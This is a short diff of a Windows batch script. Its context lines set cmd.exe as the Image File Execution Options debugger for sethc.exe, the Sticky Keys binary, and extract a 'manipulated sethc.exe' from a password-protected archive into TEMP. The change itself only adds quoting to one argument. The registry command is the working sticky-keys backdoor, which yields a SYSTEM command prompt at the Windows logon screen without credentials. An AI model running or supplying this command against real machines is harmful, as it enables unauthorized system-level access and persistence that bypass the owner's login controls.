@@ -13,4 +13,4 @@ ECHO Instead registering cmd.exe as debugger for sethc.exe
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
 
 ECHO At least place a temporary and manipulated sethc.exe in the TEMP folder
-"%ZIP%" e -p%PASS% %FILEARCH% -aoa -o"%TEMP%" workfiles\sethc.exe > NUL
+"%ZIP%" e -p%PASS% "%FILEARCH%" -aoa -o"%TEMP%" workfiles\sethc.exe > NUL
